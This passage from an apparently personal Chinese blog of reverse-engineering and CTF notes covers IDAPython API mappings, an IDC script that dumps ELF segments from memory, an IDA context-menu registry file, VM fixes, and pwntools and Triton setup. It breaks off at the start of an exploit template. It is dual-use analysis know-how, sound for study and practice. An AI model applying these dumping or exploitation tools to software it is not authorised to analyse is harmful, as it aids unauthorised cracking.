</span></span></code></pre></td></tr></table>
</div>
</div><p>可以修改申请内存限制</p>
<h2 id="idapython-常见指令">idapython 常见指令</h2>
<p>获取数值</p>
<table>
<thead>
<tr>
<th>旧的函数</th>
<th>新的函数</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Byte(addr)</strong></td>
<td>idc.get_wide_byte(addr)</td>
</tr>
<tr>
<td><strong>Word(addr)</strong></td>
<td>idc.get_wide_word(addr)</td>
</tr>
<tr>
<td><strong>Dword(addr)</strong></td>
<td>idc.get_wide_dword(addr)</td>
</tr>
<tr>
<td><strong>Qword(addr)</strong></td>
<td>idc.get_qword(addr)</td>
</tr>
</tbody>
</table>
<p>数值操作</p>
<table>
<thead>
<tr>
<th>旧函数</th>
<th>新函数</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>idc.PatchByte(addr,value)</strong></td>
<td>ida_bytes.patch_byte(addr,value)</td>
</tr>
<tr>
<td><strong>idc.PatchWord(addr,value)</strong></td>
<td>ida_bytes.patch_word(addr,value)</td>
</tr>
<tr>
<td><strong>idc.PatchDword(addr,value)</strong></td>
<td>ida_bytes.patch_Dword(addr,value)</td>
</tr>
<tr>
<td><strong>idc.PatchQword(addr,value)</strong></td>
<td>ida_bytes.patch_Qword(addr,value)</td>
</tr>
</tbody>
</table>
<p>获取地址</p>
<table>
<thead>
<tr>
<th>老版函数</th>
<th>当前7.5支持函数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>idc.ScreenEA()</strong></td>
<td><strong>idc.get_screen_ea()</strong></td>
<td>获取当前指令地址</td>
</tr>
<tr>
<td><strong>idc.MinEA() idc.StartEA() idc.BeginEA()</strong></td>
<td><strong>ida_ida.inf_get_min_ea()</strong></td>
<td>获取当前最小地址. 其中老版的三个函数都替换为了新版.使用的是同一个函数</td>
</tr>
<tr>
<td><strong>idc.MaxEA()</strong></td>
<td><strong>ida_ida.inf_get_max_ea()</strong></td>
<td>获取当前最大地址</td>
</tr>
<tr>
<td><strong>idc.SelStart()</strong></td>
<td><strong>idc.read_selection_start()</strong></td>
<td>获取当前光标选择的的块中的 起始地址</td>
</tr>
<tr>
<td><strong>idc.SelEnd()</strong></td>
<td><strong>idc.read_selection_end()</strong></td>
<td>同上 返回结束地址</td>
</tr>
</tbody>
</table>
<h2 id="dump_elf32idc">dump_elf32.idc</h2>
<p>其中ImageBase是Load段的地址，可能需要根据实际情况进行修改</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;idc.idc&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PT_LOAD              1
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PT_DYNAMIC           2
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">static</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">Message</span><span class="p">(</span><span class="s">&#34;start&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">auto</span> <span class="n">ImageBase</span><span class="p">,</span><span class="n">StartImg</span><span class="p">,</span><span class="n">EndImg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">auto</span> <span class="n">e_phoff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">auto</span> <span class="n">e_phnum</span><span class="p">,</span><span class="n">p_offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">auto</span> <span class="n">i</span><span class="p">,</span><span class="n">dumpfile</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">ImageBase</span><span class="o">=</span><span class="mh">0x8048000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">StartImg</span><span class="o">=</span><span class="mh">0x8000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">EndImg</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">Dword</span><span class="p">(</span><span class="n">ImageBase</span><span class="p">)</span><span class="o">==</span><span class="mh">0x7f454c46</span> <span class="o">||</span> <span class="nf">Dword</span><span class="p">(</span><span class="n">ImageBase</span><span class="p">)</span><span class="o">==</span><span class="mh">0x464c457f</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="n">dumpfile</span><span class="o">=</span><span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;dumpfile&#34;</span><span class="p">,</span><span class="s">&#34;wb&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">e_phoff</span><span class="o">=</span><span class="n">ImageBase</span><span class="o">+</span><span class="nf">Dword</span><span class="p">(</span><span class="n">ImageBase</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">Message</span><span class="p">(</span><span class="s">&#34;e_phoff = 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">e_phoff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="n">e_phnum</span><span class="o">=</span><span class="nf">Word</span><span class="p">(</span><span class="n">ImageBase</span><span class="o">+</span><span class="mh">0x30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">Message</span><span class="p">(</span><span class="s">&#34;e_phnum = 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">e_phnum</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">e_phnum</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                <span class="k">if</span> <span class="p">(</span><span class="nf">Dword</span><span class="p">(</span><span class="n">e_phoff</span><span class="p">)</span><span class="o">==</span><span class="n">PT_LOAD</span> <span class="o">||</span> <span class="nf">Dword</span><span class="p">(</span><span class="n">e_phoff</span><span class="p">)</span><span class="o">==</span><span class="n">PT_DYNAMIC</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                        <span class="n">p_offset</span><span class="o">=</span><span class="nf">Dword</span><span class="p">(</span><span class="n">e_phoff</span><span class="o">+</span><span class="mh">0x4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                        <span class="n">StartImg</span><span class="o">=</span><span class="nf">Dword</span><span class="p">(</span><span class="n">e_phoff</span><span class="o">+</span><span class="mh">0x8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                        <span class="n">EndImg</span><span class="o">=</span><span class="n">StartImg</span><span class="o">+</span><span class="nf">Dword</span><span class="p">(</span><span class="n">e_phoff</span><span class="o">+</span><span class="mh">0x14</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                        <span class="nf">Message</span><span class="p">(</span><span class="s">&#34;start = 0x%x, end = 0x%x, offset = 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">StartImg</span><span class="p">,</span> <span class="n">EndImg</span><span class="p">,</span> <span class="n">p_offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                        <span class="nf">dump</span><span class="p">(</span><span class="n">dumpfile</span><span class="p">,</span><span class="n">StartImg</span><span class="p">,</span><span class="n">EndImg</span><span class="p">,</span><span class="n">p_offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                        <span class="nf">Message</span><span class="p">(</span><span class="s">&#34;dump segment %d ok.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                                <span class="n">e_phoff</span><span class="o">=</span><span class="n">e_phoff</span><span class="o">+</span><span class="mh">0x20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="nf">fseek</span><span class="p">(</span><span class="n">dumpfile</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">fputc</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="n">dumpfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">fputc</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="n">dumpfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">fputc</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="n">dumpfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">fputc</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="n">dumpfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="nf">fseek</span><span class="p">(</span><span class="n">dumpfile</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">fputc</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="n">dumpfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">fputc</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="n">dumpfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">fputc</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="n">dumpfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">fputc</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="n">dumpfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="nf">fclose</span><span class="p">(</span><span class="n">dumpfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span><span class="k">else</span> <span class="nf">Message</span><span class="p">(</span><span class="s">&#34;dump err.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="nf">dump</span><span class="p">(</span><span class="n">dumpfile</span><span class="p">,</span><span class="n">startimg</span><span class="p">,</span><span class="n">endimg</span><span class="p">,</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">auto</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">auto</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">size</span><span class="o">=</span><span class="n">endimg</span><span class="o">-</span><span class="n">startimg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fseek</span><span class="p">(</span><span class="n">dumpfile</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">fputc</span><span class="p">(</span><span class="nf">Byte</span><span class="p">(</span><span class="n">startimg</span><span class="o">+</span><span class="n">i</span><span class="p">),</span><span class="n">dumpfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ida右键菜单打开">IDA右键菜单打开</h2>
<p>换成自己的ida的路径即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-react" data-lang="react"><span class="line"><span class="cl"><span class="nx">Windows</span> <span class="nx">Registry</span> <span class="nx">Editor</span> <span class="nx">Version</span> <span class="mf">5.00</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">HKEY_CLASSES_ROOT</span><span class="err">\</span><span class="o">*</span><span class="err">\</span><span class="nx">shell</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">HKEY_CLASSES_ROOT</span><span class="err">\</span><span class="o">*</span><span class="err">\</span><span class="nx">shell</span><span class="err">\</span><span class="nx">DASM</span> <span class="kd">with</span> <span class="nx">IDA</span> <span class="nx">x64</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="o">=</span><span class="s2">&#34;IDA x64&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;Icon&#34;</span><span class="o">=</span><span class="s2">&#34;\&#34;F:\\IDA7.7\\ida64.exe\&#34;, 4&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">HKEY_CLASSES_ROOT</span><span class="err">\</span><span class="o">*</span><span class="err">\</span><span class="nx">shell</span><span class="err">\</span><span class="nx">DASM</span> <span class="kd">with</span> <span class="nx">IDA</span> <span class="nx">x64</span><span class="err">\</span><span class="nx">Command</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="o">=</span><span class="s2">&#34;\&#34;F:\\IDA7.7\\ida64.exe\&#34; \&#34;%1\&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">HKEY_CLASSES_ROOT</span><span class="err">\</span><span class="o">*</span><span class="err">\</span><span class="nx">shell</span><span class="err">\</span><span class="nx">DASM</span> <span class="kd">with</span> <span class="nx">IDA</span> <span class="nx">x86</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="o">=</span><span class="s2">&#34;IDA x32&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;Icon&#34;</span><span class="o">=</span><span class="s2">&#34;\&#34;F:\\IDA7.7\\ida.exe\&#34;, 4&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">HKEY_CLASSES_ROOT</span><span class="err">\</span><span class="o">*</span><span class="err">\</span><span class="nx">shell</span><span class="err">\</span><span class="nx">DASM</span> <span class="kd">with</span> <span class="nx">IDA</span> <span class="nx">x86</span><span class="err">\</span><span class="nx">Command</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="o">=</span><span class="s2">&#34;\&#34;F:\\IDA7.7\\ida.exe\&#34; \&#34;%1\&#34;&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ubuntu加内存">ubuntu加内存</h2>
<p>外部：</p>
<p>关机之后点击扩容然后选择想要扩容成的大小</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125150856220.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125150856220.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125150856220.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125150856220.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125150856220.png"
        title="image-20230125150856220" /></p>
<p>内部：</p>
<p>安装gparted</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt-get install gparted
</span></span></code></pre></td></tr></table>
</div>
</div><p>打开gparted,右键/dev/sda1 更改大小，拖到最右，然后同样的方法/dev/sda5，最后点击上面的对勾即可</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151036336.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151036336.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151036336.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151036336.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151036336.png"
        title="image-20230125151036336" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151307095.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151307095.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151307095.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151307095.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151307095.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125151307095.png" /></p>
<h2 id="虚拟机繁忙无法关机">虚拟机繁忙，无法关机</h2>
<p>找到<a href="https://so.csdn.net/so/search?q=VMware&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreffer ">VMware</a> workstation VMX 结束进程</p>
<h2 id="python-显示某某decode不了或者encode不了">python 显示某某decode不了或者encode不了</h2>
<p>试试<code>latin-1</code></p>
<h3 id="pwntools-使用">pwntools 使用</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">asm(&#34;syscall; ret&#34;).encode(&#39;hex&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="共享文件夹突然消失">共享文件夹突然消失</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ~/
</span></span><span class="line"><span class="cl">sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o <span class="nv">uid</span><span class="o">=</span><span class="m">1000</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="编译32bit程序">编译32bit程序</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt-get install build-essential module-assistant  
</span></span><span class="line"><span class="cl">sudo apt-get install gcc-multilib g++-multilib 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwntools解决tmux-waiting-for-debugger">pwntools解决tmux waiting for debugger</h2>
<p>升级到最新版本即可或者是4.8.0,但是原装的terminal就不能愉快的调试了。。。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pip2 install pwntools==4.10.0b0
</span></span><span class="line"><span class="cl">pip install pwntools==4.10.0b0
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pip2 install pwntools==4.8.0
</span></span><span class="line"><span class="cl">pip install pwntools==4.8.0
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="triton安装">Triton安装</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/JonathanSalwan/Triton.git
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> Triton
</span></span><span class="line"><span class="cl">mkdir build
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> build
</span></span><span class="line"><span class="cl">cmake ..
</span></span><span class="line"><span class="cl">sudo make -j install
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="cmake版本太小">cmake版本太小</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://cmake.org/files/v3.22/cmake-3.22.1.tar.gz
</span></span><span class="line"><span class="cl">tar -xvzf cmake-3.22.1.tar.gz
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> cmake-3.22.1
</span></span><span class="line"><span class="cl">./configure
</span></span><span class="line"><span class="cl">sudo make 
</span></span><span class="line"><span class="cl">sudo make install
</span></span><span class="line"><span class="cl">sudo update-alternatives --install /usr/bin/cmake cmake /usr/local/bin/cmake <span class="m">1</span> --force
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="缺少bitwuzla">缺少BITWUZLA</h3>
<p>真顺利，还以为会报很多错</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/bitwuzla/bitwuzla
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> bitwuzla
</span></span><span class="line"><span class="cl">./contrib/setup-cadical.sh
</span></span><span class="line"><span class="cl">./contrib/setup-btor2tools.sh
</span></span><span class="line"><span class="cl">./contrib/setup-symfpu.sh
</span></span><span class="line"><span class="cl">./configure.sh --shared
</span></span><span class="line"><span class="cl">sudo make -C build install
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="capstone路径不对">capstone路径不对</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./make.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>打开makefile</p>
<p>把PREFIX改成/usr/local</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230326163916809.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230326163916809.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230326163916809.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230326163916809.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230326163916809.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230326163916809.png" /></p>
<h3 id="安装以后不能用">安装以后不能用</h3>
<p>输出路径，将编译好的triton.so放入路径里面</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;from sysconfig import get_paths; info = get_paths(); print(info[&#39;stdlib&#39;])&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="自用pwntools利用模板">自用pwntools利用模板</h2>
<p>效果</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230322011524691.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230322011524691.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230322011524691.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230322011524691.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230322011524691.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230322011524691.png" /></p>
<h4 id="pwnupmako">pwnup.mako</h4>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230623114629763.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230623114629763.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230623114629763.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230623114629763.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230623114629763.png"
        title="image-20230623114629763" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
